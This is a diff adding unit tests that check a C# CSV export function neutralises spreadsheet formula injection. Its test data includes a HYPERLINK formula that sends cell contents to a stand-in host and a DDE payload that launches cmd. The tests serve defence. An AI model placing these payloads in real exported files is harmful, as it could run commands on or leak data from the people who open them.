@@ -33,6 +33,69 @@ namespace StewardshipSurvey.Tests.Unit
             Assert.Equal(2, CountCsvFields(row));
         }
 
+        /// <summary>
+        /// Formula injection. A spreadsheet decides a cell is a formula from its first
+        /// character, after stripping the CSV quoting - so RFC 4180 escaping does not help
+        /// here and these are a separate concern from the tests above.
+        /// </summary>
+        [Theory]
+        [InlineData("=1+1")]
+        [InlineData("+1+1")]
+        [InlineData("-1+1")]
+        [InlineData("@SUM(A1)")]
+        [InlineData("=HYPERLINK(\"http://example.com/?d=\"&A1,\"Click\")")]
+        [InlineData("=cmd|\'/c calc\'!A1")]
+        public void CsvField_neutralises_a_leading_formula_trigger(string input)
+        {
+            var field = MemberReportModel.CsvField(input);
+
+            Assert.StartsWith("\"\'", field);
+            Assert.Equal("\"\'" + input.Replace("\"", "\"\"") + "\"", field);
+        }
+
+        [Theory]
+        [InlineData("TRIGGER=1+1")]
+        [InlineData("TRIGGER\t=1+1")]
+        [InlineData("TRIGGER   @SUM(A1)")]
+        public void CsvField_looks_past_leading_whitespace(string template)
+        {
+            // A spreadsheet ignores leading whitespace when deciding, so a value cannot be
+            // smuggled through by padding it.
+            var input = template.Replace("TRIGGER", "");
+
+            Assert.StartsWith("\"\'", MemberReportModel.CsvField(input));
+        }
+
+        [Theory]
+        [InlineData("Bob")]
+        [InlineData("b@example.com")]        // @ is only a trigger in first position
+        [InlineData("Smith, Bob")]
+        [InlineData("5551234")]
+        [InlineData("")]
+        public void CsvField_leaves_ordinary_values_alone(string input)
+        {
+            // The prefix is visible to whoever opens the file, so it must not appear on
+            // values that were never dangerous.
+            Assert.DoesNotContain("\'", MemberReportModel.CsvField(input));
+        }
+
+        [Fact]
+        public void CsvField_still_escapes_quotes_in_a_neutralised_value()
+        {
+            // The two jobs have to compose: the prefix goes on, and RFC 4180 doubling still
+            // applies to the quote inside.
+            Assert.Equal("\"\'=A1&\"\"x\"\"\"", MemberReportModel.CsvField("=A1&\"x\""));
+        }
+
+        [Fact]
+        public void CsvField_neutralising_a_value_does_not_add_a_column()
+        {
+            var row = string.Join(",", new[] { "=1+1", "b@example.com" }
+                .Select(MemberReportModel.CsvField));
+
+            Assert.Equal(2, CountCsvFields(row));
+        }
+
         [Theory]
         [InlineData("1,2,3", new[] { 1, 2, 3 })]
         [InlineData(" 1 , 2 ", new[] { 1, 2 })]      // whitespace tolerated
